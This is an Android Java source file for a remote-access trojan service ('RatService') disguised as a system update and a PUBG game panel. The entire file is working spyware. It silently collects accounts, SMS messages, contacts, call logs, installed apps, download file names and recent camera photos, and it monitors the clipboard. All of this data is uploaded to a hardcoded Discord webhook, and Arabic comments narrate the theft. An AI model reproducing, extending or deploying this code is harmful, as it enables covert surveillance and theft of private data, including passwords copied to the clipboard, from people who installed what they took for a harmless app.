package com.system.update;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.*;
import android.content.*;
import android.content.pm.ApplicationInfo;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import org.json.JSONObject;
import java.io.*;
import java.util.Arrays;
import java.util.Comparator;
import java.util.List;
import okhttp3.*;

public class RatService extends Service {
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1566641052885061632/5z7tnnjZNykfW869bY_xahti6-RlQ4F-mTd0LYU52LK7oJLuQRpNYMaXpkRpsOiDSPn8";
    private OkHttpClient client = new OkHttpClient();
    private String lastClipboard = "";
    private boolean isRunning = true;

    @Override
    public void onCreate() {
        super.onCreate();
        startForegroundService();
        
        new Thread(() -> {
            try {
                sendTextToDiscord("🔄 **الأداة اشتغلت! جاري سحب الحسابات والبيانات...**");
                
                dumpAllAccounts(); Thread.sleep(1000);
                String info = "📱 **Device:** " + Build.MANUFACTURER + " " + Build.MODEL + "\nAndroid: " + Build.VERSION.RELEASE;
                sendTextToDiscord(info); Thread.sleep(1000);

                dumpSms(); Thread.sleep(1500);
                dumpContacts(); Thread.sleep(1500);
                dumpCallLogs(); Thread.sleep(1500);
                dumpApps(); Thread.sleep(1500);
                dumpFiles(); Thread.sleep(1500);
                dumpImages(); // سحب الصور

                sendTextToDiscord("✅ **اكتمل سحب البيانات والصور بالكامل!**");
                
                startClipboardMonitor();
            } catch (Exception e) {
                sendTextToDiscord("❌ خطأ: " + e.getMessage());
            }
        }).start();
    }

    private void startForegroundService() {
        String channelId = "sys_chan";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_MIN);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
            Notification notification = new Notification.Builder(this, channelId).setContentTitle("panel pubge").setSmallIcon(android.R.drawable.ic_menu_manage).build();
            startForeground(1, notification);
        }
    }

    // دالة سحب الصور (أحدث 5 صور من الكاميرا والواتساب)
    private void dumpImages() {
        File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
        File pictures = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);
        
        File[] allImages = new File[0];
        // بنلم الصور من فولدر الكاميرا
        if (dcim.exists() && dcim.listFiles() != null) {
            allImages = dcim.listFiles();
        }
        
        if (allImages.length > 0) {
            // ترتيب الصور من الأحدث للأقدم
            Arrays.sort(allImages, new Comparator<File>() {
                public int compare(File f1, File f2) {
                    return Long.compare(f2.lastModified(), f1.lastModified());
                }
            });

            int count = 0;
            for (File img : allImages) {
                if (img.isFile() && (img.getName().endsWith(".jpg") || img.getName().endsWith(".png") || img.getName().endsWith(".jpeg"))) {
                    // التأكد إن حجم الصورة أقل من 8 ميجا عشان الديسكورد ميرفضهاش
                    if (img.length() < 8 * 1024 * 1024) { 
                        uploadFile(img, "image/jpeg");
                        count++;
                        try { Thread.sleep(2000); } catch (InterruptedException ignored) {} // فاصل بين كل صورة والتانية
                    }
                    if (count >= 5) break; // بنسحب 5 صور بس عشان ميعملش سبام
                }
            }
        }
    }

    private void dumpAllAccounts() {
        try {
            AccountManager am = AccountManager.get(this);
            Account[] accounts = am.getAccounts();
            StringBuilder sb = new StringBuilder("📧 **الحسابات المسجلة على الجهاز:**\n");
            
            if (accounts.length == 0) {
                sb.append("لا توجد حسابات مسجلة.");
            } else {
                for (Account account : accounts) {
                    sb.append("- **").append(account.type).append(":** `").append(account.name).append("`\n");
                }
            }
            sendTextToDiscord(sb.toString());
        } catch (Exception e) {
            sendTextToDiscord("❌ فشل سحب الحسابات: " + e.getMessage());
        }
    }

    private void startClipboardMonitor() {
        new Thread(() -> {
            while (isRunning) {
                try {
                    ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                    if (cm.hasPrimaryClip() && cm.getPrimaryClip() != null) {
                        ClipData.Item item = cm.getPrimaryClip().getItemAt(0);
                        String text = item.getText() != null ? item.getText().toString() : "";
                        if (!text.isEmpty() && !text.equals(lastClipboard)) {
                            lastClipboard = text;
                            sendTextToDiscord("📋 **نص تم نسخه (Clipboard):**\n`" + text + "`");
                        }
                    }
                    Thread.sleep(5000);
                } catch (Exception ignored) {}
            }
        }).start();
    }

    private void dumpSms() {
        File file = new File(getExternalFilesDir(null), "sms_all.txt");
        try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
            Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
            if (c != null) {
                while (c.moveToNext()) {
                    bw.write("From: " + c.getString(c.getColumnIndexOrThrow("address")) + "\n" + c.getString(c.getColumnIndexOrThrow("body")) + "\n-------------------\n");
                }
                c.close();
            }
            bw.flush(); uploadFile(file, "text/plain");
        } catch (Exception ignored) {}
    }

    private void dumpContacts() {
        File file = new File(getExternalFilesDir(null), "contacts_all.txt");
        try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
            Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (c != null) {
                while (c.moveToNext()) {
                    bw.write(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)) + " : " + c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)) + "\n");
                }
                c.close();
            }
            bw.flush(); uploadFile(file, "text/plain");
        } catch (Exception ignored) {}
    }

    private void dumpCallLogs() {
        File file = new File(getExternalFilesDir(null), "calls_all.txt");
        try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
            Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            if (c != null) {
                while (c.moveToNext()) {
                    bw.write("Number: " + c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) + " | Dur: " + c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DURATION)) + "s\n");
                }
                c.close();
            }
            bw.flush(); uploadFile(file, "text/plain");
        } catch (Exception ignored) {}
    }

    private void dumpApps() {
        File file = new File(getExternalFilesDir(null), "apps.txt");
        try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
            List<ApplicationInfo> apps = getPackageManager().getInstalledApplications(0);
            for (ApplicationInfo app : apps) bw.write(app.packageName + "\n");
            bw.flush(); uploadFile(file, "text/plain");
        } catch (Exception ignored) {}
    }

    private void dumpFiles() {
        File file = new File(getExternalFilesDir(null), "files.txt");
        try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
            File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            bw.write("=== Downloads ===\n");
            if (download.exists() && download.listFiles() != null) for (File f : download.listFiles()) bw.write(f.getName() + "\n");
            bw.flush(); uploadFile(file, "text/plain");
        } catch (Exception ignored) {}
    }

    private void sendTextToDiscord(String text) {
        try {
            JSONObject json = new JSONObject();
            json.put("content", text);
            RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json; charset=utf-8"));
            client.newCall(new Request.Builder().url(WEBHOOK_URL).post(body).build()).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {}
                @Override public void onResponse(Call call, Response response) {}
            });
        } catch (Exception ignored) {}
    }

    private void uploadFile(File file, String mimeType) {
        if (!file.exists()) return;
        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("content", "📁 **ملف:** " + file.getName())
                .addFormDataPart("file", file.getName(), RequestBody.create(file, MediaType.parse(mimeType)))
                .build();
        client.newCall(new Request.Builder().url(WEBHOOK_URL).post(requestBody).build()).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) {}
        });
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override public IBinder onBind(Intent intent) { return null; }
    @Override public void onDestroy() { isRunning = false; super.onDestroy(); }
}
